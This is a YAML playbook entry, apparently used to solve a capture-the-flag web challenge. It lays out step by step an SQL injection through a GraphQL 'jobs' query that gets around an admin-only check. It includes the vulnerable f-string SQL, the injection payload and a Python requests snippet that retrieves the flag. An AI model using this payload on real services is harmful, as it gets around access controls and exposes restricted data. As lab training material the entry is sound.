name: graphql_sql_injection
category: web
tags: [graphql, sqli, sql_injection, access_control]
indicators:
  - "GraphQL"
  - "SQL query with string concatenation"
  - "f-string in SQL"
  - "access control bypass"

tricks:
  - name: "Step 1: Discover GraphQL endpoint"
    when: "First access"
    how: "Observe functionality and endpoints"
    payload: |
      POST /graphql
      {"query": "{ jobs(jobType: \"back-end\") { id name type description } }"}

  - name: "Step 2: Identify SQL injection"
    when: "Analyze source code"
    how: "Find unsafe SQL concatenation"
    payload: |
      query = f"SELECT * FROM jobs WHERE type = '{job_type}'"
      # Direct user input concatenation = SQL injection

  - name: "Step 3: Find access control restriction"
    when: "Try querying private"
    how: "Test blocked access"
    payload: |
      {"query": "{ jobs(jobType: \"private\") { ... } }"}
      # Error: "Only admins can see private jobs"
      # Code: if job_type == 'private': raise Exception(...)

  - name: "Step 4: Bypass via SQL injection"
    when: "Confirmed restriction"
    how: "Construct payload that passes Python check but injects SQL"
    payload: |
      payload = "' OR type='private' --"
      # Python check: "' OR type='private' --" != 'private' -> passes!
      # SQL: WHERE type = '' OR type='private' --'
      # Result: returns private jobs

  - name: "Step 5: Extract the flag"
    when: "Execute attack"
    how: "Send GraphQL query with SQLi payload"
    payload: |
      payload = "' OR type='private' --"
      query = '{ jobs(jobType: "%s") { id name type description } }' % payload
      resp = requests.post(url, json={'query': query})
      # Flag in private job's description
